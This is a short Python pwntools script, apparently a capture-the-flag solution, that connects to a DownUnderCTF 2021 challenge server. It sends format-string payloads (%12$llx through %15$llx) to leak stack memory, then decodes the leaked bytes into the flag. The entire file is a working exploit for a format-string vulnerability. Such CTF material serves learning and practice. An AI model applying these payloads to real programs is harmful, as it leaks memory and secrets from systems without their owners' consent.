from pwn import *

s = remote('pwn-2021.duc.tf', 31918)

flag = ''

s.sendlineafter(b'?\n', b'%12$llx')

s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]

s.sendlineafter(b'?\n', b'%13$llx')

s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]

s.sendlineafter(b'?\n', b'%14$llx')

s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]

s.sendlineafter(b'?\n', b'%15$llx')

s.recvuntil(b', ')
flag += bytes.fromhex(s.recvline().strip().decode('utf-8')).decode('utf-8')[::-1]

s.close()

print(flag)
